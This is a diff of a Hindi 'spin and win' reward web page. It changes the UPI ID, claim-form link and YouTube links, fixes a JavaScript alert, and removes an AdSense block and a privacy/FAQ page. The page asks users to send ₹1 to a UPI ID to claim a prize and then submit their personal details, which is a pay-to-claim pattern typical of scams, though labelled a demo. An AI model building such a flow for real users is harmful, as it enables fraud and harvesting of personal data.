@@ -298,36 +298,24 @@
     </div>
     <div id="walletInfo" style="display: none;">
       <p>पुरस्कार प्राप्त करने के लिए इस UPI ID पर ₹1 भेजें:</p>
-      <input type="text" id="walletAddress" value="mrrupesh.kumar000@ybl" readonly>
+      <input type="text" id="walletAddress" value="rupeshelectronics@upi" readonly>
       <button id="copyWalletBtn" onclick="copyWalletAddress()">कॉपी करें</button>
       <p class="wallet-instructions">भुगतान करने के बाद क्लेम बटन पर क्लिक करें और भुगतान रसीद अपलोड करें। ध्यान दें: यह सिर्फ एक डेमो है, असली पैसे न भेजें।</p>
     </div>
   </div>
 
-  <a id="claimBtn" class="action-btn" href="https://docs.google.com/forms/d/e/1FAIpQLSet_ZKG6gAtWZm8NWbHp3cOxNdhQDTU0pn23pCS8sTG9ucrsQ/viewform?usp=header" target="_blank" style="display: none;">Claim Your Reward</a>
+  <a id="claimBtn" class="action-btn" href="https://docs.google.com/forms/d/e/1FAIpQLSdMQUoLxp4NEXEboQOSq5g66NefBEiI-yw4DN265MAgnfry5A/viewform?usp=header" target="_blank" style="display: none;">Claim Your Reward</a>
 
   <div class="youtube-section">
     <h3>हमारे YouTube चैनल से जुड़ें</h3>
     <p>नवीनतम ऑफर और अपडेट के लिए हमारे YouTube चैनल को सब्सक्राइब करें</p>
     <div class="youtube-container">
-      <iframe width="10%" height="20" src="https://www.youtube.com/embed/oyhOtPFHUqI" frameborder="0" allowfullscreen></iframe>
+      <iframe src="https://www.youtube.com/embed?listType=user_uploads&list=RUPESH_ELECTRONICS" frameborder="0" allowfullscreen></iframe>
     </div>
-    <a href="https://youtube.com/@mrrupeshkumar000?si=_77n-4eJOrIgIiM7" class="action-btn" target="_blank">Subscribe Now</a>
+    <a href="https://www.youtube.com/channel/YOUR_CHANNEL_ID" class="action-btn" target="_blank">Subscribe Now</a>
   </div>
 </div>
-<div style="text-align: center; padding: 20px; background: #fffbe7; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
-  <h2>हमारे YouTube चैनल से जुड़ें</h2>
-  <p>नवीनतम ऑफ़र और अपडेट के लिए हमारे वीडियो को देखें और चैनल को सब्सक्राइब करें</p>
 
-  <iframe width="100%" height="200" src="https://www.youtube.com/embed/oyhOtPFHUqI" frameborder="0" allowfullscreen style="border-radius: 10px;"></iframe>
-
-  <br><br>
-  <a href="https://youtube.com/@mrrupeshkumar000?si=_77n-4eJOrIgIiM7" target="_blank">
-    <button style="background-color: #FF0000; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer;">
-      अब सब्सक्राइब करें
-    </button>
-  </a>
-</div>
 <div id="rewardsTab" class="tab-content">
   <div class="reward-history">
     <h3>आपके पुरस्कार</h3>
@@ -382,22 +370,6 @@
 <div class="ads-section">
   <h3>Sponsored Ads</h3>
   <!-- AdSense Code -->
-  <h3 style="text-align:center;">Sponsored Ads</h3>
-
-<div style="margin: 20px auto; max-width: 100%; text-align: center;">
-  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8956191401262476"
-     crossorigin="anonymous"></script>
-  <!-- RUPESH 1ST -->
-  <ins class="adsbygoogle"
-       style="display:block"
-       data-ad-client="ca-pub-8956191401262476"
-       data-ad-slot="8106152892"
-       data-ad-format="auto"
-       data-full-width-responsive="true"></ins>
-  <script>
-       (adsbygoogle = window.adsbygoogle || []).push({});
-  </script>
-</div>
   <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-YOUR_PUBLISHER_ID" crossorigin="anonymous"></script>
   <!-- Horizontal Ad -->
   <ins class="adsbygoogle"
@@ -435,7 +407,7 @@
   <a href="https://whatsapp.com/channel/0029Va8ksDrF6smvRNvEdt1y" target="_blank" title="WhatsApp">
     <img src="https://cdn-icons-png.flaticon.com/512/733/733585.png" alt="WhatsApp">
   </a>
-  <a href="https://youtube.com/@mrrupeshkumar000?si=Ozqirt2CoVFH-nDM" target="_blank" title="YouTube">
+  <a href="https://www.youtube.com/channel/YOUR_CHANNEL_ID" target="_blank" title="YouTube">
     <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
   </a>
 </div>
@@ -562,7 +534,7 @@
 
   // Wallet functions
   function selectWallet(walletName) {
-    alert(आपने ${walletName} चुना है। पुरस्कार प्राप्त करने के लिए UPI ID का उपयोग करें।);
+    alert(`आपने ${walletName} चुना है। पुरस्कार प्राप्त करने के लिए UPI ID का उपयोग करें।`);
   }
 
   function copyWalletAddress() {
@@ -594,8 +566,8 @@
     
     alert("लॉगिन सफल! (डेमो)");
     // In a real app, you would validate credentials with your backend
-  
   }
+
   function register() {
     const name = document.getElementById('regName').value;
     const email = document.getElementById('regEmail').value;
@@ -646,56 +618,4 @@
   drawWheel();
 </script>
 </body>
-<!DOCTYPE html>
-<html lang="hi">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Privacy Policy | FAQs | Disclaimer</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      line-height: 1.6;
-      background: #f5f5f5;
-      padding: 20px;
-    }
-    h2 {
-      color: #d9534f;
-    }
-    section {
-      background: #fff;
-      padding: 20px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-  </style>
-</head>
-<body>
-
-  <section>
-    <h2>प्राइवेसी पॉलिसी,</h2>
-    <p>हम आपके व्यक्तिगत डेटा की सुरक्षा को गंभीरता से लेते हैं। हम आपके नाम, ईमेल, फ़ोन नंबर और UPI आईडी जैसी जानकारी केवल इनाम भेजने के उद्देश्य से एकत्र करते हैं। आपकी जानकारी को कभी भी किसी तीसरे पक्ष के साथ साझा नहीं किया जाएगा।</p>
-  </section>
-
-  <section>
-    <h2>अक्सर पूछे जाने वाले प्रश्न (FAQs)</h2>
-    <p><strong>Q1: मैं इनाम कैसे जीत सकता हूँ?</strong><br>
-    A1: आप Spin & Win,से इनाम जीत सकते हैं।</p>
-
-    <p><strong>Q2: मैं इनाम कैसे प्राप्त करूँ?</strong><br>
-    A2: जीतने के बाद, कृपया अपने नाम, ईमेल, फ़ोन नंबर और UPI आईडी के साथ फॉर्म भरें। इनाम मैन्युअल रूप से UPI के जरिए भेजा जाएगा।</p>
-
-    <p><strong>Q3: क्या इनाम मिलने की गारंटी है?</strong><br>
-    A3: नहीं, सभी इनाम रैंडम और भाग्य पर आधारित होते हैं।</p>
-  </section>
-
-  <section>
-    <h2>डिस्क्लेमर</h2>
-    <p>यह वेबसाइट केवल मनोरंजन और प्रमोशन के उद्देश्य से बनाई गई है। इसमें दिए गए ऑफर्स,रिवार्ड्स किसी भी प्रकार की गारंटी के साथ नहीं आते। किसी भी नुकसान के लिए हम उत्तरदायी नहीं होंगे। यूज़र को अपनी सूझबूझ से भाग लेना चाहिए।</p>
-  </section>
-
-</body>
-</html>
-  
 </html>
